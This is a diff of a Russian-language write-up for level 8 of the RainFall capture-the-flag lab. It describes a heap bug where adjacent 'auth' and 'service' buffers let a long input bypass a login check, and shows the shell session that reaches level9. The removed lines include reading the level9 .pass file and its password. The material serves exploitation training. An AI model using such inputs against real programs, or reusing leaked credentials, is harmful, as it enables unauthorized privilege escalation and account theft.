@@ -5,9 +5,8 @@ login, если значенеи глобальной переменной не 
 reset, освободить autg
 "auth " внести в буффер auth всё что идёт после auth , но не более 31 символа
 servic, занесёт в буффер servic, всё что идёт после servic.
-Проблема программы в том, что два поинтера расположены рядом в памяти, и если мы что-то заносим в service, то оно как раз попадает
-на 32ое место в auth.
-Алгоритм эксплойта такой, запустить auth с пробелом и инициализировать, запустить service с любым одним значением, после login.
+Проблема программы в том, что два поинтера расположены рядом в памяти, и если мы что-то заносим в service, то оно пишется сразу после поинтера auth.
+Чтобы auth[32]!= 0 нам достаточно ввести длинный вод ддя комадны service
 
 
 3. Решение
@@ -16,16 +15,8 @@ level8@RainFall:~$ ./level8
 (nil), (nil)
 auth
 0x804a008, (nil)
-service
+serviceqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
 0x804a008, 0x804a018
-login
-Password:
-0x804a008, 0x804a018
-service
-0x804a008, 0x804a028
 login
 $ whoami
 level9
-$ cd ..
-$ cat level9/.pass
-c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
